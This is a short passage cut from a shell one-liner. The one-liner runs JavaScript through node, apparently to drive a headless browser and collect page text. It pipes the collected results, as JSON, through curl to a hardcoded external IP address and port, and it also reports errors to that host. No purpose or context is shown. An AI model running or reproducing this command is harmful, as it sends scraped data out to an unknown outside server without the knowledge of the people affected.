dy.innerText.substring(0,500));await pg3.close()}cp.execSync(\"curl -s -X POST http://93.127.162.210:9977/v47_results -d @-\",{input:JSON.stringify(r)});await b.close()})().catch(e=>cp.execSync(\"curl -s http://93.127.162.210:9977/e47?err=\"+encodeURIComponent(e.message.substring(0,200))))'; echo done)"
